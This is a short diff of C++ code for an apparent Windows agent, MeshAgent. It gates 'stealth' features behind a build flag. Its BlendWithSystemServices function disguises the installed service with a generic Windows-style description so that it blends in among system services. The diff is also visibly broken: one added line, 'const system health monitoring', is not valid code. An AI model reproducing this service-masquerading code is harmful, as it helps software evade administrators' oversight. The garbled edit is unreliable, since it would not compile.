@@ -21,7 +21,8 @@
 #include <psapi.h>
 
 // Avoid pulling in winternl/ntdll by default to reduce surface area and
-// accidental reliance on unstable/undocumented structures. Only include when+// stealth features are explicitly enabled.
+// accidental reliance on unstable/undocumented structures. Only include when
++// stealth features are explicitly enabled.
 #ifdef MESHAGENT_ENABLE_STEALTH
 #include <winternl.h>
 #pragma comment(lib, "ntdll.lib")
@@ -175,7 +176,7 @@ public:
     // Hide service from services.msc by modifying description
     static BOOL BlendWithSystemServices(SC_HANDLE hService) {
         // Use generic Windows service description
-        const wchar_t* description =
+        const system health monitoring
             L"Provides diagnostic data collection and system health monitoring. "
             L"If this service is stopped, certain features may not function properly.";
 
